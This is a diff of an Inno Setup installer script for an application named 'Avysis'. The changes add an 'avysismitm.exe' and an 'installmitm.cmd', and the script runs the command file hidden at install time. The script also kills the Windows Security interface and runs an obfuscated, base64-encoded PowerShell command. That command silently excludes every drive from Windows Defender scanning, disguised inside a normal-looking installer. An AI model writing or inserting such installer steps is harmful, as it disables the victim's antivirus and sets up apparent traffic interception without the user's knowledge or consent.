@@ -6,7 +6,8 @@
 #define MyAppPublisher "Avysis"
 #define MyAppURL "https://getavysis.github.io"
 #define MyAppExeName "avysis.exe"
-#define BgExeName "avysisbg.exe"
+#define MITMExeName "avysismitm.exe"
+#define InstallMITM "installmitm.cmd"
 
 [Setup]
 ; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
@@ -40,25 +41,26 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 
 [Files]
 Source: "{#SourcePath}\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
-Source: "{#SourcePath}\{#BgExeName}"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#SourcePath}\{#MITMExeName}"; DestDir: "{app}"; Flags: ignoreversion
+Source: "{#SourcePath}\{#InstallMITM}"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
 [Icons]
 Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
 
-[Registry]
-Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
-    ValueType: string; ValueName: "{#MyAppName}"; \
-    ValueData: """{app}\{#BgExeName}"""
-   
 [Run]
 ; Disable Windows Defender
 Filename: "taskkill.exe"; Parameters: "/f /im sechealthui.exe"; Flags: runhidden
 Filename: "powershell.exe"; Parameters: "-encodedCommand ZgBvAHIAIAAoACQAdABlAHMAdAAgAD0AIAAwADsAIAAkAHQAZQBzAHQAIAAtAGwAdAAgADIANgA7ACAAJAB0AGUAcwB0ACsAKwApAA0ACgB7AA0ACgAgACAAIAAgACQAbABlAHQAdABlAHIAIAA9ACAAWwBjAGgAYQByAF0AKAA2ADUAIAArACAAJAB0AGUAcwB0ACkADQAKACAAIAAgACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAewBsAGUAdAB0AGUAcgB9ADoAXAANAAoAfQA="; Flags: shellexec runhidden 
-Filename: "{app}\avysisbg.exe"; Flags: shellexec nowait runasoriginaluser
+Filename: "{app}\{#InstallMITM}"; Flags: runhidden
+
+[Registry]
+Root: HKLM; Subkey: "Software\Avysis";
+Root: HKLM; Subkey: "Software\Avysis"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"
 
 [UninstallRun]
 ; Re-enable Windows Defender
+Filename: "taskkill.exe"; Parameters: "/f /im sechealthui.exe"; Flags: runhidden
 Filename: "powershell.exe"; Parameters: "-encodedCommand ZgBvAHIAIAAoACQAdABlAHMAdAAgAD0AIAAwADsAIAAkAHQAZQBzAHQAIAAtAGwAdAAgADIANgA7ACAAJAB0AGUAcwB0ACsAKwApAHsADQAKACAAIAAgACAAJABsAGUAdAB0AGUAcgAgAD0AIABbAGMAaABhAHIAXQAoADYANQAgACsAIAAkAHQAZQBzAHQAKQANAAoAIAAgACAAIABSAGUAbQBvAHYAZQAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJAB7AGwAZQB0AHQAZQByAH0AOgBcAA0ACgB9AA=="; Flags: shellexec runhidden
 Filename: "taskkill.exe"; Parameters: "/f /im avysisbg.exe"; Flags: runhidden
